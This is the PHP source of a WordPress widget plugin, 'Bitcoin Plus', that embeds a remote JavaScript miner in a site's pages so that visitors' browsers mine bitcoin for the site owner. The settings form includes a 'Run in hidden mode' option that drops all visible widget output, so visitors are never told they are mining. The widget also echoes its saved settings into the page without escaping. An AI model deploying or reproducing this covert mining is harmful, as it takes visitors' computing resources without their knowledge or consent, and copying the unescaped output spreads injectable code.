<?php

add_action( 'widgets_init', 'bitcoinplus_load_widget' );

function bitcoinplus_load_widget() {
	register_widget( 'BitcoinPlus_Widget' );
}


add_action('init', 'bitcoinplus_widget_initjq');

function bitcoinplus_widget_initjq() {
    wp_enqueue_script('jquery');
}    



class BitcoinPlus_Widget extends WP_Widget {

	function BitcoinPlus_Widget() {
		$widget_ops = array( 'classname' => 'bitcoinplus', 'description' => __('Earn money by having your visitors generate bitcoin for you', 'bitcoinplus') );
		$this->WP_Widget( 'bitcoinplus-widget', __('Bitcoin Plus', 'bitcoinplus'), $widget_ops);
	}

	function widget( $args, $instance ) {
		extract( $args );

		$title = apply_filters('widget_title', $instance['title'] );

		$code = "<script src=\"http://www.bitcoinplus.com/js/miner.js\" type=\"text/javascript\"></script>";

		if ($instance['addlink']) {
			$code .= "<a href=\"http://www.bitcoinplus.com\">Bitcoin Plus</a>";
		}

		$code .= "<script type=\"text/javascript\">BitcoinPlusMiner(\"" . $instance['email'] . "\"";
		if (!$instance['nonvisual']) {
			$code .= ", {addControls: true}";
		}
		$code .= "); ";

		if (!$instance['nonvisual']) {
		$code .= "(function() { var s = document.getElementsByTagName('script'); var m = s[s.length-1]; var b = jQuery(m).prev(); if (b.is('a')) { b = b.prev('div'); } b.children('strong').remove(); })();";
		}

		$code .= "</script>";

		if (!$instance['nonvisual']) {
			echo $before_widget;
			if ( $title ) {
				echo $before_title . $title . $after_title;
			}
		}
		if ($instance['addlink']) {
			echo "<a href=\"http://www.bitcoinplus.com/miner/whatsthis\" target=\"_blank\">What's this?</a>";
		}
		echo $code;
	

		if (!$instance['nonvisual']) {
			echo $after_widget;
		}
	}

	function update( $new_instance, $old_instance ) {
		$instance = $old_instance;

		$instance['email'] = $new_instance['email'];
		$instance['title'] = $new_instance['title'];
		$instance['nonvisual'] = isset($new_instance['nonvisual']);
		$instance['addlink'] = isset($new_instance['addlink']);
		return $instance;
	}

	function form( $instance ) {

		$defaults = array( 'title' => __('Bitcoin Plus Website Miner', 'bitcoinplus'), 'nonvisual' => false, 'email' => 'donny@bitcoinplus.com', 'addlink' => false);
		$instance = wp_parse_args( (array) $instance, $defaults );
 ?>


<script type="text/javascript">
function bitcoinplus_nonvisual_clicked() {
	var checked = document.getElementById("<?php echo $this->get_field_id('nonvisual'); ?>").checked;
	if (checked) {
		document.getElementById("<?php echo $this->get_field_id( 'title' ); ?>").disabled = "disabled";
		document.getElementById("<?php echo $this->get_field_id('addlink'); ?>").disabled = "disabled";
	} else {
		document.getElementById("<?php echo $this->get_field_id( 'title' ); ?>").removeAttribute("disabled");
		document.getElementById("<?php echo $this->get_field_id('addlink'); ?>").removeAttribute("disabled");
	}
}
</script>



		<p>
			<label for="<?php echo $this->get_field_id( 'email' ); ?>"><?php _e('Email (registered at <a href="http://www.bitcoinplus.com/register" target="_blank">Bitcoin Plus</a>) or <a href="http://www.bitcoinplus.com/miner/plugins/wordpress#use-user-id" target="_blank">user ID</a>:', 'bitcoinplus'); ?></label>
			<input id="<?php echo $this->get_field_id( 'email' ); ?>" name="<?php echo $this->get_field_name( 'email' ); ?>" value="<?php echo $instance['email']; ?>" style="width:100%;" />
		</p>

<p><input id="<?php echo $this->get_field_id('nonvisual'); ?>" name="<?php echo $this->get_field_name('nonvisual'); ?>" type="checkbox" <?php checked($instance['nonvisual']); ?> onclick="bitcoinplus_nonvisual_clicked()" />&nbsp;<label for="<?php echo $this->get_field_id('nonvisual'); ?>"><?php _e('Run in hidden mode'); ?></label></p>

		<p>
			<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e('Title:', 'bitcoinplus'); ?></label>
			<input id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" value="<?php echo $instance['title']; ?>" style="width:100%;" />
		</p>

<p><input id="<?php echo $this->get_field_id('addlink'); ?>" name="<?php echo $this->get_field_name('addlink'); ?>" type="checkbox" <?php checked($instance['addlink']); ?> />&nbsp;<label for="<?php echo $this->get_field_id('addlink'); ?>"><?php _e('Add a link to Bitcoin Plus (<a href="http://www.bitcoinplus.com/miner/plugins/wordpress#add-link" target="_blank">read why</a>)'); ?></label></p>

<script type="text/javascript">
jQuery(bitcoinplus_nonvisual_clicked);
</script>
	<?php
	}
}

?>
